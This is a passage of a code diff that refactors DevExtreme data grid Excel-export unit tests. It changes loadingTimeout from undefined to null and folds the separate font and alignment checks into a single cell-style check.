-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[0], ds[1]]
             }).dxDataGrid('instance');
@@ -3258,8 +3196,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 1 }, { row: 3, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -3278,7 +3215,7 @@ const moduleConfig = {
                     { caption: 'Field 3', calculateCellValue: rowData => rowData.f1 + '!', groupIndex: 0 }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -3298,8 +3235,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -3319,7 +3255,7 @@ const moduleConfig = {
                     { caption: 'Field 3', calculateCellValue: rowData => rowData.f1 + '!', groupIndex: 0 }
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[1]]
             }).dxDataGrid('instance');
@@ -3336,8 +3272,7 @@ const moduleConfig = {
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false, selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 2, column: 2 }, topLeft);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 1], topLeft.row);
@@ -3356,7 +3291,7 @@ const moduleConfig = {
                     { dataField: 'f2', dataType: 'string' },
                 ],
                 dataSource: ds,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false,
                 selectedRowKeys: [ds[1]]
             }).dxDataGrid('instance');
@@ -3372,8 +3307,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 1 }, { row: 2, column: 1 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 1], topLeft.row);
@@ -3402,7 +3336,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3420,8 +3354,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 4, column: 1 }, { row: 4, column: 1 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 0, 1], topLeft.row);
@@ -3449,7 +3382,7 @@ const moduleConfig = {
                         groupItems: [{ name: 'GroupItems 1', column: 'f2', summaryType: 'max', customizeText: (cell) => 'custom' }]
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3492,7 +3425,7 @@ const moduleConfig = {
                         ]
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3514,8 +3447,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 6, column: 1 }, { row: 6, column: 1 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1, 0, 1, 1], topLeft.row);
@@ -3546,7 +3478,7 @@ const moduleConfig = {
                     },
                     showColumnHeaders: false,
                     rtlEnabled: true,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3568,8 +3500,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 6, column: 1 }, { row: 6, column: 1 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null, { 'rightToLeft': true });
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1, 0, 1, 1], topLeft.row);
@@ -3602,7 +3533,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3624,8 +3555,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 0, 1], topLeft.row);
@@ -3659,7 +3589,7 @@ const moduleConfig = {
                     },
                     selectedRowKeys: [ds[1]],
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3678,8 +3608,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -3706,7 +3635,7 @@ const moduleConfig = {
                     },
                     dataSource: ds,
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3728,8 +3657,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 6, column: 1 }, { row: 6, column: 1 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 2, 0, 1, 2], topLeft.row);
@@ -3758,7 +3686,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3778,8 +3706,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 5, column: 1 }, { row: 5, column: 1 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 2, 1, 2], topLeft.row);
@@ -3809,7 +3736,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3841,8 +3768,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 11, column: 1 }, { row: 11, column: 1 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 2, 2, 2, 1, 2, 2, 2, 2, 2], topLeft.row);
@@ -3875,7 +3801,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3918,8 +3844,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 11, column: 2 }, { row: 11, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 2, 2, 2, 1, 2, 2, 2, 2, 2], topLeft.row);
@@ -3953,7 +3878,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -3983,8 +3908,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 5, column: 3 }, { row: 5, column: 3 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 2, 1, 2], topLeft.row);
@@ -4018,7 +3942,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -4048,8 +3972,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 5, column: 3 }, { row: 5, column: 3 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 2, 1, 2], topLeft.row);
@@ -4077,7 +4000,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4101,8 +4024,7 @@ const moduleConfig = {
                     helper.checkRowAndColumnCount({ row: 3, column: 3 }, { row: 3, column: 3 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
                     helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn250Pixels, undefined], topLeft.column);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4130,7 +4052,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4154,8 +4076,7 @@ const moduleConfig = {
                     helper.checkRowAndColumnCount({ row: 3, column: 3 }, { row: 3, column: 3 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
                     helper.checkColumnWidths([excelColumnWidthFromColumn100Pixels, excelColumnWidthFromColumn150Pixels, excelColumnWidthFromColumn250Pixels, undefined], topLeft.column);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4183,7 +4104,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4204,8 +4125,7 @@ const moduleConfig = {
                     helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
                     helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4233,7 +4153,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4254,8 +4174,7 @@ const moduleConfig = {
                     helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
                     helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4283,7 +4202,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4304,8 +4223,7 @@ const moduleConfig = {
                     helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
                     helper.checkColumnWidths([excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4333,7 +4251,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4357,8 +4275,7 @@ const moduleConfig = {
                     helper.checkRowAndColumnCount({ row: 3, column: 3 }, { row: 3, column: 3 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
                     helper.checkColumnWidths([excelColumnWidthFromColumn300Pixels, excelColumnWidthFromColumn200Pixels, excelColumnWidthFromColumn300Pixels, undefined], topLeft.column);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4390,7 +4307,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4417,8 +4334,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 4, column: 3 }, { row: 4, column: 3 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1, 1], topLeft.row);
@@ -4450,7 +4366,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4473,8 +4389,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 3, column: 3 }, { row: 3, column: 3 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4506,7 +4421,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4529,8 +4444,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1, 1], topLeft.row);
@@ -4562,7 +4476,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4585,8 +4499,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 4, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4618,7 +4531,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4638,8 +4551,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4671,7 +4583,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4694,8 +4606,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1, 1], topLeft.row);
@@ -4727,7 +4638,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     dataSource: ds,
-                    loadingTimeout: undefined,
+                    loadingTimeout: null,
                     showColumnHeaders: false
                 }).dxDataGrid('instance');
 
@@ -4747,8 +4658,7 @@ const moduleConfig = {
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                     helper.checkAutoFilter(autoFilterEnabled, null);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 1, 1], topLeft.row);
@@ -4781,7 +4691,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -4802,8 +4712,7 @@ const moduleConfig = {
 
                 exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                     helper.checkRowAndColumnCount({ row: 4, column: 2 }, { row: 4, column: 2 }, topLeft);
-                    helper.checkFont(expectedCells);
-                    helper.checkAlignment(expectedCells);
+                    helper.checkCellStyle(expectedCells);
                     helper.checkValues(expectedCells);
                     helper.checkMergeCells(expectedCells, topLeft);
                     helper.checkOutlineLevel([0, 0, 0, 0], topLeft.row);
@@ -4831,7 +4740,7 @@ const moduleConfig = {
                         enabled: masterDetailEnabled
                     },
                     showColumnHeaders: false,
-                    loadingTimeout: undefined
+                    loadingTimeout: null
                 }).dxDataGrid('instance');
 
                 const expectedCells = [[
@@ -4873,7 +4782,7 @@ const moduleConfig = {
                 wordWrapEnabled: false,
                 rtlEnabled: true,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -4893,8 +4802,7 @@ const moduleConfig = {
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false })).then((cellRange) => {
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 done();
@@ -4924,7 +4832,7 @@ const moduleConfig = {
                 },
                 wordWrapEnabled: true,
                 showColumnHeaders: false,
-                loadingTimeout: undefined
+                loadingTimeout: null
             }).dxDataGrid('instance');
 
             const expectedCells = [[
@@ -4944,8 +4852,7 @@ const moduleConfig = {
             helper._extendExpectedCells(expectedCells, topLeft);
 
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { keepColumnWidths: false })).then((cellRange) => {
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 done();
@@ -4973,7 +4880,7 @@ const moduleConfig = {
                     ]
                 },
                 showColumnHeaders: false,
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 selectedRowKeys: [ds[1]]
             }).dxDataGrid('instance');
 
@@ -4993,8 +4900,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells, { selectedRowsOnly: true })).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5022,7 +4928,7 @@ const moduleConfig = {
                         { column: 'f1', summaryType: 'max' }
                     ]
                 },
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -5042,8 +4948,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0], topLeft.row);
@@ -5071,7 +4976,7 @@ const moduleConfig = {
                         { column: 'f2', summaryType: 'max' }
                     ]
                 },
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -5091,8 +4996,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5119,7 +5023,7 @@ const moduleConfig = {
                         { column: 'f3', summaryType: 'max' }
                     ]
                 },
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -5139,8 +5043,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5168,7 +5071,7 @@ const moduleConfig = {
                         { column: 'f1', summaryType: 'max' }
                     ]
                 },
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -5188,8 +5091,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 3, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
-                helper.checkFont(expectedCells);
-                helper.checkAlignment(expectedCells);
+                helper.checkCellStyle(expectedCells);
                 helper.checkValues(expectedCells);
                 helper.checkMergeCells(expectedCells, topLeft);
                 helper.checkOutlineLevel([0, 0, 0], topLeft.row);
@@ -5217,7 +5119,7 @@ const moduleConfig = {
                         { column: 'f2', summaryType: 'max' }
                     ]
                 },
-                loadingTimeout: undefined,
+                loadingTimeout: null,
                 showColumnHeaders: false
             }).dxDataGrid('instance');
 
@@ -5237,8 +5139,7 @@ const moduleConfig = {
             exportDataGrid(getOptions(this, dataGrid, expectedCells)).then((cellRange) => {
                 helper.checkRowAndColumnCount({ row: 2, column: 2 }, { row: 3, column: 2 }, topLeft);
                 helper.checkAutoFilter(autoFilterEnabled, null);
